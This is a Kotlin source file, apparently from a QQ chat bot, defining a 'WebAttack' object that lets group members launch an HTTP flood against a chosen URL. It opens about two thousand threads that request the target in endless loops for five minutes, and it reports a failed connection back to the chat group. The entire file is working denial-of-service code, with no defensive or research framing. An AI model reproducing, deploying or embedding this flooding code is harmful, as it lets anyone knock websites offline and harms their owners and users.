package com.xbaimiao.bot.minecraft.attack

import com.icecreamqaq.yuq.mf
import com.icecreamqaq.yuq.yuq
import java.io.IOException
import java.net.URL


object WebAttack {

	private val threadList = ArrayList<Thread>()

	var isRun = false

	fun webAttack(group: Long, url: URL) {
		try {
			url.openStream()
			isRun = true
			Thread {
				Thread.sleep(300000)
				stop()
				isRun = false
			}.start()
			for (x in 0..2000) {
				run(url)
			}
		} catch (e: IOException) {
			yuq.groups[group]?.sendMessage(mf.newMessage() + "目标网站连接失败，请重试")
		}
	}

	private fun run(url: URL) {
		val run = Runnable {
			while (true) {
				try {
					url.openStream()
				} catch (e: IOException) {

				}
			}
		}
		val thread = Thread(run)
		threadList.add(thread)
		thread.start()
	}

	private fun stop() {
		for (thread in threadList) {
			thread.stop()
		}
	}
}